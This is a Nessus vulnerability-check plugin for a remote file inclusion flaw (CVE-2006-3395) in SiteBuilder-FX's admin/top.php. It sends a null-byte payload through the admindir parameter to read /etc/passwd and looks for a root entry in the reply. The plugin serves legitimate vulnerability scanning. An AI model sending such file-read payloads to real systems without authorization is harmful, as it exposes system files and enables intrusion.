#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(21787);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-3395");
  script_bugtraq_id(18756);

  script_name(english:"SiteBuilder-FX top.php admindir Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file include attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running SiteBuilder-FX, a web-based design system
written in PHP. 

The version of SiteBuilder-FX installed on the remote host fails to
sanitize input to the 'admindir' parameter of the 'admin/top.php'
script before using it to include PHP code.  Regardless of the setting
of PHP's 'register_globals', an unauthenticated attacker may be able
to exploit these flaws to view arbitrary files on the remote host or
to execute arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/sitebuilder", "/introbuilder", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/admin/top.php?",
      "admindir=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like SiteBuilder and ...
    "<TITLE>SiteBuilder-FX" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/default\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = strstr(res, "<td valign=top>");
      if (contents) contents = contents - "<td valign=top>";
    }

    if (contents)
    {
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
